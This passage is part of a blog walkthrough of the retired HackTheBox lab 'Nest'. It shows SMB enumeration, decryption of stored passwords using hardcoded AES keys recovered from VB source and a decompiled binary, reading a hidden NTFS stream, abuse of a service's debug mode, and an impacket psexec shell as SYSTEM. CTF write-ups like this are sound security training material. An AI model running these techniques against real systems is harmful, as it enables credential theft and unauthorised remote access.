</pre></table></code></div></div><p>The file shows us a temp.txt file that is in the DIR Carl in the share Secure$ and lets see if we can access it</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" /&gt;
</pre></table></code></div></div><p>After enumerating the Share <code class="language-plaintext highlighter-rouge">Secure$</code> i got a Dir called VB Projects abd there was a file in it called Utils.vb and after reading the file i was sure that the Hash of the file RU_config.xml was encrypted using this methodology</p><div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
</pre><td class="rouge-code"><pre><span class="k">Imports</span> <span class="nn">System.Text</span>
<span class="k">Imports</span> <span class="nn">System.Security.Cryptography</span>
<span class="k">Public</span> <span class="k">Class</span> <span class="nc">Utils</span>

    <span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">GetLogFilePath</span><span class="p">()</span> <span class="ow">As</span> <span class="kt">String</span>
        <span class="k">Return</span> <span class="n">IO</span><span class="p">.</span><span class="n">Path</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">CurrentDirectory</span><span class="p">,</span> <span class="s">"Log.txt"</span><span class="p">)</span>
    <span class="k">End</span> <span class="k">Function</span>




    <span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">DecryptString</span><span class="p">(</span><span class="n">EncryptedString</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">String</span>
        <span class="k">If</span> <span class="kt">String</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">)</span> <span class="k">Then</span>
            <span class="k">Return</span> <span class="kt">String</span><span class="p">.</span><span class="n">Empty</span>
        <span class="k">Else</span>
            <span class="k">Return</span> <span class="n">Decrypt</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">,</span> <span class="s">"N3st22"</span><span class="p">,</span> <span class="s">"88552299"</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s">"464R5DFA5DL6LE28"</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span>
        <span class="k">End</span> <span class="k">If</span>
    <span class="k">End</span> <span class="k">Function</span>

    <span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">EncryptString</span><span class="p">(</span><span class="n">PlainString</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">String</span>
        <span class="k">If</span> <span class="kt">String</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">PlainString</span><span class="p">)</span> <span class="k">Then</span>
            <span class="k">Return</span> <span class="kt">String</span><span class="p">.</span><span class="n">Empty</span>
        <span class="k">Else</span>
            <span class="k">Return</span> <span class="n">Encrypt</span><span class="p">(</span><span class="n">PlainString</span><span class="p">,</span> <span class="s">"N3st22"</span><span class="p">,</span> <span class="s">"88552299"</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s">"464R5DFA5DL6LE28"</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span>
        <span class="k">End</span> <span class="k">If</span>
    <span class="k">End</span> <span class="k">Function</span>

    <span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">Encrypt</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">plainText</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">passPhrase</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">saltValue</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                    <span class="k">ByVal</span> <span class="n">passwordIterations</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">initVector</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">keySize</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">)</span> <span class="n">_</span>
                           <span class="ow">As</span> <span class="kt">String</span>

        <span class="k">Dim</span> <span class="nv">initVectorBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">initVector</span><span class="p">)</span>
        <span class="k">Dim</span> <span class="nv">saltValueBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">saltValue</span><span class="p">)</span>
        <span class="k">Dim</span> <span class="nv">plainTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">plainText</span><span class="p">)</span>
        <span class="k">Dim</span> <span class="nv">password</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">passPhrase</span><span class="p">,</span> <span class="n">_</span>
                                           <span class="n">saltValueBytes</span><span class="p">,</span> <span class="n">_</span>
                                           <span class="n">passwordIterations</span><span class="p">)</span>
        <span class="k">Dim</span> <span class="nv">keyBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="k">CInt</span><span class="p">(</span><span class="n">keySize</span> <span class="o">/</span> <span class="mi">8</span><span class="p">))</span>
        <span class="k">Dim</span> <span class="nv">symmetricKey</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">AesCryptoServiceProvider</span>
        <span class="n">symmetricKey</span><span class="p">.</span><span class="n">Mode</span> <span class="o">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span>
        <span class="k">Dim</span> <span class="nv">encryptor</span> <span class="ow">As</span> <span class="n">ICryptoTransform</span> <span class="o">=</span> <span class="n">symmetricKey</span><span class="p">.</span><span class="n">CreateEncryptor</span><span class="p">(</span><span class="n">keyBytes</span><span class="p">,</span> <span class="n">initVectorBytes</span><span class="p">)</span>
        <span class="k">Using</span> <span class="n">memoryStream</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">()</span>
            <span class="k">Using</span> <span class="n">cryptoStream</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> <span class="n">_</span>
                                            <span class="n">encryptor</span><span class="p">,</span> <span class="n">_</span>
                                            <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Write</span><span class="p">)</span>
                <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">plainTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
                <span class="n">cryptoStream</span><span class="p">.</span><span class="n">FlushFinalBlock</span><span class="p">()</span>
                <span class="k">Dim</span> <span class="nv">cipherTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span> <span class="o">=</span> <span class="n">memoryStream</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
                <span class="n">memoryStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
                <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
                <span class="k">Return</span> <span class="n">Convert</span><span class="p">.</span><span class="n">ToBase64String</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">)</span>
            <span class="k">End</span> <span class="k">Using</span>
        <span class="k">End</span> <span class="k">Using</span>
    <span class="k">End</span> <span class="k">Function</span>

    <span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">Decrypt</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">cipherText</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">passPhrase</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">saltValue</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                    <span class="k">ByVal</span> <span class="n">passwordIterations</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">initVector</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">keySize</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">)</span> <span class="n">_</span>
                           <span class="ow">As</span> <span class="kt">String</span>

        <span class="k">Dim</span> <span class="nv">initVectorBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">initVectorBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">initVector</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">saltValueBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">saltValueBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">saltValue</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">cipherTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">cipherTextBytes</span> <span class="o">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">cipherText</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">password</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">passPhrase</span><span class="p">,</span> <span class="n">_</span>
                                           <span class="n">saltValueBytes</span><span class="p">,</span> <span class="n">_</span>
                                           <span class="n">passwordIterations</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">keyBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">keyBytes</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="k">CInt</span><span class="p">(</span><span class="n">keySize</span> <span class="o">/</span> <span class="mi">8</span><span class="p">))</span>

        <span class="k">Dim</span> <span class="nv">symmetricKey</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">AesCryptoServiceProvider</span>
        <span class="n">symmetricKey</span><span class="p">.</span><span class="n">Mode</span> <span class="o">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span>

        <span class="k">Dim</span> <span class="nv">decryptor</span> <span class="ow">As</span> <span class="n">ICryptoTransform</span>
        <span class="n">decryptor</span> <span class="o">=</span> <span class="n">symmetricKey</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">(</span><span class="n">keyBytes</span><span class="p">,</span> <span class="n">initVectorBytes</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">memoryStream</span> <span class="ow">As</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
        <span class="n">memoryStream</span> <span class="o">=</span> <span class="k">New</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">cryptoStream</span> <span class="ow">As</span> <span class="n">CryptoStream</span>
        <span class="n">cryptoStream</span> <span class="o">=</span> <span class="k">New</span> <span class="n">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> <span class="n">_</span>
                                        <span class="n">decryptor</span><span class="p">,</span> <span class="n">_</span>
                                        <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">plainTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="k">ReDim</span> <span class="n">plainTextBytes</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">decryptedByteCount</span> <span class="ow">As</span> <span class="kt">Integer</span>
        <span class="n">decryptedByteCount</span> <span class="o">=</span> <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span> <span class="n">_</span>
                                               <span class="mi">0</span><span class="p">,</span> <span class="n">_</span>
                                               <span class="n">plainTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>

        <span class="n">memoryStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
        <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>

        <span class="k">Dim</span> <span class="nv">plainText</span> <span class="ow">As</span> <span class="kt">String</span>
        <span class="n">plainText</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span> <span class="n">_</span>
                                            <span class="mi">0</span><span class="p">,</span> <span class="n">_</span>
                                            <span class="n">decryptedByteCount</span><span class="p">)</span>

        <span class="k">Return</span> <span class="n">plainText</span>
    <span class="k">End</span> <span class="k">Function</span>



<span class="k">End</span> <span class="k">Class</span>
</pre></table></code></div></div><p>I used an online compiler for this Visual Basics code it is – <a href="https://dotnetfiddle.net/">dotnetfiddle compiler</a></p><p>The Decrypt function is the function which is going to be used to decrypt the hashSo we are just going to call the function is main and printing the result returned by the function The function will accept the following arguments</p><h3 id="decrypthash-n3st22-88552299-2-464r5dfa5dl6le28-256"><code class="language-plaintext highlighter-rouge">Decrypt("HASH", "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)</code></h3><p>And only declare the function <code class="language-plaintext highlighter-rouge">Decrypt</code> in the script</p><p>Here is the full Script to decrypt the hash – <a href="https://drive.google.com/file/d/1F98TGmZzz5ZSabVlKyLTqEm1DeoMupHM/view">Decrypt_hash.vb</a></p><p>Now just run the script by choosing language to VB.NET and Project type to CONSOLE I just got the Password – <code class="language-plaintext highlighter-rouge">xRxRxPANCAK3SxRxRx</code></p><h2 id="usertxt">user.txt</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>┌─[prashant@parrot]─[/home/prashant]
└──╼ <span class="nv">$smbclient</span> //nest.htb/Users <span class="nt">-U</span> C.smith
Enter WORKGROUP<span class="se">\C</span>.smiths password: 
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">cd </span>C.Smith<span class="se">\</span>
smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sun Jan 26 02:21:44 2020
  ..                                  D        0  Sun Jan 26 02:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 19:06:17 2019
  user.txt                            A       32  Thu Aug  8 19:05:24 2019

		10485247 blocks of size 4096. 6449696 blocks available
smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> 
</pre></table></code></div></div><p>Now After checking the HQK Reporting DIR I got a file called Debug Mode Password.txt and it seems to be empty</p><p>But after running <code class="language-plaintext highlighter-rouge">allinfo</code> command on the file we got all available info about the file</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> allinfo <span class="s2">"Debug Mode Password.txt"</span>
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
attributes: A <span class="o">(</span>20<span class="o">)</span>
stream: <span class="o">[</span>::<span class="nv">$DATA</span><span class="o">]</span>, 0 bytes
stream: <span class="o">[</span>:Password:<span class="nv">$DATA</span><span class="o">]</span>, 15 bytes
</pre></table></code></div></div><p>Now just Reading the file using the <code class="language-plaintext highlighter-rouge">more</code> command</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smb: \C.Smith\HQK Reporting\&gt; more DEBUGM~1.TXT:Password:$DATA
</pre></table></code></div></div><p>And we got the Password – <code class="language-plaintext highlighter-rouge">WBQ201953D8w</code></p><p>And i also find a .exe binary in the same dir and i downloaded it to my system</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\A</span>D Integration Module<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Fri Aug  9 08:18:42 2019
  ..                                  D        0  Fri Aug  9 08:18:42 2019
  HqkLdap.exe                         A    17408  Wed Aug  7 19:41:16 2019

		10485247 blocks of size 4096. 6449666 blocks available
smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\A</span>D Integration Module<span class="se">\&gt;</span> get HqkLdap.exe 
getting file <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\A</span>D Integration Module<span class="se">\H</span>qkLdap.exe of size 17408 as HqkLdap.exe <span class="o">(</span>9.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 9.2 KiloBytes/sec<span class="o">)</span>
</pre></table></code></div></div><p>Now I just started digging the higher port 4286 and Connected to it using telnet and typing help i got the commands i can use on the service</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>┌─[✗]─[prashant@parrot]─[/home/prashant]
└──╼ <span class="nv">$telnet</span> nest.htb 4386
Trying 10.10.10.178...
Connected to nest.htb.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>

HQK Reporting Service V1.2

<span class="o">&gt;</span><span class="nb">help

</span>This service allows <span class="nb">users </span>to run queries against databases using the legacy HQK format

<span class="nt">---</span> AVAILABLE COMMANDS <span class="nt">---</span>

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
</pre></table></code></div></div><p>And we can see a DEBUG command we can use along with the password that we got from the share Users</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="o">&gt;</span>debug WBQ201953D8w

Debug mode enabled. Use the HELP <span class="nb">command </span>to view additional commands that are now available
<span class="o">&gt;</span><span class="nb">help

</span>This service allows <span class="nb">users </span>to run queries against databases using the legacy HQK format

<span class="nt">---</span> AVAILABLE COMMANDS <span class="nt">---</span>

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
SERVICE
SESSION
SHOWQUERY &lt;Query_ID&gt;
</pre></table></code></div></div><p>Now we have some extra powers (we have some extra commands that we can run) and using <code class="language-plaintext highlighter-rouge">SHOWQUERY</code> we can read the files</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">   </span><span class="nf">HqkLdap.exe</span><span class="w">
</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">   </span><span class="nx">Ldap.conf</span><span class="w">

</span><span class="nf">Current</span><span class="w"> </span><span class="nx">Directory:</span><span class="w"> </span><span class="nx">ldap</span><span class="w">
</span><span class="err">&gt;</span><span class="nf">showquery</span><span class="w"> </span><span class="nx">2</span><span class="w">

</span><span class="nf">Domain</span><span class="o">=</span><span class="nf">nest.local</span><span class="w">
</span><span class="nx">Port</span><span class="o">=</span><span class="mi">389</span><span class="w">
</span><span class="nf">BaseOu</span><span class="o">=</span><span class="nf">OU</span><span class="o">=</span><span class="nf">WBQ</span><span class="w"> </span><span class="nx">Users</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="nf">Production</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">nest</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
</span><span class="nx">User</span><span class="o">=</span><span class="nf">Administrator</span><span class="w">
</span><span class="nx">Password</span><span class="o">=</span><span class="nf">yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4</span><span class="o">=</span><span class="w">
</span></pre></table></code></div></div><p>So here we got another hash and the user is Administrator.</p><p>And its time for the binary we got from share</p><p>i Decompiled the binary using the Dotpeek decompiler that is only available for Windows and i downloaded it from here – <a href="https://www.jetbrains.com/decompiler/download/#section=web-installer">Dotpeek Decompiler</a></p><p>There is a CR module in the the Binary</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/nest/cr.png" alt="alt cr-module" /></p><p>This contains the Arguments that we have to pass in the same script from which we Decrypted the user hash because the hash that we found in LDAP.conf is encrypted using another method which we got in CR module(part) and the arguments that we will pass in the Decrypt_hash.vb and compile it</p><div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="n">namespace</span> <span class="n">HqkLdap</span>
<span class="p">{</span>
  <span class="n">public</span> <span class="n">class</span> <span class="n">CR</span>
  <span class="p">{</span>
    <span class="n">private</span> <span class="n">const</span> <span class="n">string</span> <span class="n">K</span> <span class="o">=</span> <span class="s">"667912"</span><span class="err">;</span>
    <span class="n">private</span> <span class="n">const</span> <span class="n">string</span> <span class="n">I</span> <span class="o">=</span> <span class="s">"1L1SA61493DRV53Z"</span><span class="err">;</span>
    <span class="n">private</span> <span class="n">const</span> <span class="n">string</span> <span class="n">SA</span> <span class="o">=</span> <span class="s">"1313Rf99"</span><span class="err">;</span>

    <span class="n">public</span> <span class="n">static</span> <span class="n">string</span> <span class="n">DS</span><span class="p">(</span><span class="n">string</span> <span class="n">EncryptedString</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">return</span> <span class="n">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">)</span> <span class="err">?</span> <span class="n">string</span><span class="p">.</span><span class="n">Empty</span> <span class="p">:</span> <span class="n">CR</span><span class="p">.</span><span class="n">RD</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">,</span> <span class="s">"667912"</span><span class="p">,</span> <span class="s">"1313Rf99"</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="s">"1L1SA61493DRV53Z"</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span><span class="err">;</span>
    <span class="p">}</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/nest/run-cr.png" alt="alt cr-module" /></p><p>Now we got the password – <code class="language-plaintext highlighter-rouge">XtH4nkS4Pl4y1nGX</code></p><p>Now we can access the <code class="language-plaintext highlighter-rouge">C$</code> share and get the flag</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>smb: <span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                  DR        0  Sun Jan 26 02:20:50 2020
  ..                                 DR        0  Sun Jan 26 02:20:50 2020
  desktop.ini                       AHS      282  Sat Jan 25 17:02:44 2020
  root.txt                            A       32  Mon Aug  5 18:27:26 2019

		10485247 blocks of size 4096. 6449680 blocks available
</pre></table></code></div></div><h1 id="shell-as-administrator">Shell as Administrator</h1><p>I usec the tool <code class="language-plaintext highlighter-rouge">psexec.py</code> from impacket and specify the <code class="language-plaintext highlighter-rouge">password</code> i got.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>/usr/share/doc/python-impacket/examples/psexec.py Administrator@10.10.10.178
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation         
Password:                                                                                                                                             
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.178...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file TQInnfxj.exe 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.178.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service RINN on 10.10.10.178.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service RINN..... 
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands  
Microsoft Windows <span class="o">[</span>Version 6.1.7601]                                                             
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.                                                                                       
                                                                                                                                         
C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
nt authority<span class="se">\s</span>ystem
</pre></table></code></div></div><h2 id="got-roottxt">Got root.txt</h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nf">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
</span><span class="mi">65</span><span class="o">****************************</span><span class="mi">41</span><span class="w">
</span><span class="nf">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a> <a href="/tags/vbscript/" class="post-tag no-text-decoration" >vbscript</a> <a href="/tags/telnet/" class="post-tag no-text-decoration" >telnet</a> <a href="/tags/decryption/" class="post-tag no-text-decoration" >Decryption</a> <a href="/tags/ldap/" class="post-tag no-text-decoration" >ldap</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Nest writeup - 0xPrashant&url=http://localhost:4000/posts/htb-nest/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Nest writeup - 0xPrashant&u=http://localhost:4000/posts/htb-nest/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Nest writeup - 0xPrashant&url=http://localhost:4000/posts/htb-nest/" data-toggle="tooltip" 